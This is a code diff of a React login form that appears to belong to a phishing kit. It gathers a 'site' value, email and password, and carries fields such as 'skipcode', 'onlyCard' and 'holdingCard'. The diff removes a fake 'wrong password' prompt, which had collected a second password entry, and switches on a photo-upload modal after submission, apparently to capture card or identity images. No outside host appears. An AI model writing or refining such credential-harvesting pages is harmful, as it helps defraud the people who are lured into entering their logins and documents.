@@ -11,31 +11,30 @@ import { toast } from "react-toastify";
 
 function LoginForm() {
   const [verified, setVerified] = useState(false);
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
-  // const [showModal, setShowModal] = useState(false);
+  // const [showWrongPassword, setShowWrongPassword] = useState(false);
+  const [showModal, setShowModal] = useState(false);
 
   const initialvalues = {
     email: "",
     password: "",
-    wrongPassword: "",
+    // wrongPassword: "",
   };
 
   const { login } = useMockLogin();
 
   const handleSubmit = async (values, formik) => {
-    const { email, password,wrongPassword } = values;
+    const { email, password } = values;
 
     // Cookies.set("site", site);
     // Cookies.set("email", email);
     // Cookies.set("password", password);
 
-    // setShowModal(true);
+    setShowModal(true);
 
     const allValues = {
       site: site,
       email: email,
       password: password,
-      wrongPassword: wrongPassword,
       skipcode: "",
       // onlyCard: Cookies.get("onlyCard"),
       // holdingCard: Cookies.get("holdingCard"),
@@ -52,10 +51,10 @@ function LoginForm() {
 
   //   setShowModal(true);
   // };
-  const handleWrongPassword = () => {
-    setShowWrongPassword(true);
-    toast.error("Wrong password, try again");
-  };
+  // const handleWrongPassword = () => {
+  //   setShowWrongPassword(true);
+  //   toast.error("Wrong password, try again");
+  // };
 
   const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
   // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
@@ -96,8 +95,8 @@ function LoginForm() {
                   name="email"
                   required
                 />
-                      {!showWrongPassword ? (
-                <>
+                 
+          
                   <Field
                      className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                     placeholder="Password"
@@ -106,21 +105,9 @@ function LoginForm() {
                     autoComplete="on"
                     required
                   />
-                </>
-              ) : (
-                <>
-                  <Field
-                     className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
-                    placeholder="Password"
-                    name="wrongPassword"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
-
                
-                </>
-              )}
+               
+              
               </div>
               <div className="flex flex-col items-center">
                 {/* <ReCAPTCHA
@@ -145,16 +132,7 @@ function LoginForm() {
                   placeholder="Enter code from the picture"
                   required
                 />
-                {!showWrongPassword?(<button
-                  type="submit"
-                  // type="button"
-                  onClick={handleWrongPassword}
-                  className="mt-4 bg-custom-orange text-white uppercase text-[20px] px-[21px] py-[8px] tracking-wider"
-                  // disabled={!verified}
-                  // onClick={handleNextStep}
-                >
-                  SUBMIT
-                </button>):(<button
+              <button
                   type="submit"
                   // type="button"
                   className="mt-4 bg-custom-orange text-white uppercase text-[20px] px-[21px] py-[8px] tracking-wider"
@@ -162,10 +140,10 @@ function LoginForm() {
                   // onClick={handleNextStep}
                 >
                   SUBMIT
-                </button>)}
+                </button>
               </div>
 
-              {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
+              {showModal && <PhotoUpload setShowModal={setShowModal} />}
             </Form>
           )}
         </Formik>
